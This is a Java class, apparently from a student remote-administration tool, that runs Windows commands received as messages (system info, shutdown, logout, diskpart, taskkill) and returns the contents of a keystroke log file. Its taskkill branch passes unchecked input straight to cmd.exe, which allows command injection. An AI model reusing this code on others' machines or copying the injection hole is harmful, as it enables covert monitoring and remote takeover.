/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package User;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import javax.swing.filechooser.FileSystemView;

/**
 *
 * @author Dell
 */
class CMDClient {

    public String cmd(String sms) throws IOException {
        String kq = lenh(sms);
        String tam = "";
        try {
            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", kq);
            // thực thi command line
            Process p = builder.start();
            // lấy kết quả trả về trên command line
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while (true) {
                line = r.readLine();
                tam = tam + "\n" + line;
                if (line == null) {
                    break;
                }
                // System.out.println(line);
            }
        } catch (IOException ex) {
            System.out.println("loi Ping: " + ex.toString());
        }
        return tam;
    }

    public String lenh(String sms) throws IOException {
        String kq = null;
        if (sms.equals("systeminfo")) {
            kq = "systeminfo";
        }
        if (sms.equals("tasklist")) {
            kq = "tasklist";
        }
        if (sms.equals("shutdown")) {
            
            
            
            kq = "shutdown -s ";
            
            
        }
        if (sms.equals("logout")) {
            
            kq = "shutdown -l ";
            
            
        }
        if (sms.equals("disk")) {
            File file = new File("diskpart.txt");
            String link = file.getAbsolutePath();
            kq = "diskpart /s " + link;
        }
        if (sms.equals("CPU")) {
            kq = "wmic cpu get caption, deviceid, name, numberofcores, maxclockspeed, status";
        }
        if (sms.equals("RAM")) {
            kq = "wmic MEMORYCHIP get BankLabel,DeviceLocator,Capacity,Speed,Model,SerialNumber,PartNumber,Manufacturer,Memorytype,Formfactor";
        }
        if (sms.equals("network")) {
            kq = "ipconfig /all";
        }
        if (sms.equals("follow")) {
            kq = "systeminfo | find \"Physical Memory\" & wmic cpu get loadpercentage";
        }

        if (sms.contains("tasklist&Name=")) {
            String tam1 = sms.substring(14);
            kq = "taskkill /IM " + tam1;
        }

        return kq;
    }

    public String dockeyslog() {
        String kq = "";
        try {
            File file = new File("keyslog.txt");
            FileReader fr = new FileReader(file);
            BufferedReader br = new BufferedReader(fr);
            String line;
            while ((line = br.readLine()) != null) {
                kq = kq + "\n" + line;
            }
        } catch (Exception e) {
            kq="khong co du lieu";
        }

        return kq;
    }

    public String disk() {
        FileSystemView fsv = FileSystemView.getFileSystemView();

        File[] drives = File.listRoots();
        Formatdata format=new Formatdata();
        String tam = "";
        if (drives != null && drives.length > 0) {
            for (File aDrive : drives) {

                tam = tam +aDrive + "   " + aDrive.getFreeSpace()/1000000000 + " Gb /" + aDrive.getTotalSpace()/1000000000 + " Gb \n";

            }

        }
        return tam;
    }
    public int process() throws IOException{
        int co=0;
		      try {
            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "tasklist");
            // thực thi command line
            Process p = builder.start();
            // lấy kết quả trả về trên command line
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while (true) {
                
                line = r.readLine();
                co++;
                if (line == null) {
                    break;
                }
                }
        } catch (Exception e) {
        }
            
                 return  co-4;
    }

//    public byte[] capscreen() throws IOException {
//        byte[] kq = null;
//        File filenircmd = new File("nircmd-x64");
//        String linknircmd = filenircmd.getAbsolutePath();
//        File file = new File("data\\capscreen.png");
//        String absolutePath = '"' + file.getAbsolutePath() + '"';
//        String absolutePath1 = file.getAbsolutePath();
//        ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "cd " + linknircmd + " & nircmd.exe cmdwait  savescreenshot " + absolutePath);
//        // thực thi command line
//        Process p = builder.start();
//        byte[] bytes = new byte[(int) file.length()];
//        DataInputStream dis = new DataInputStream(new FileInputStream(file));
//        dis.read(bytes);
//        return kq = bytes;
//    }

}
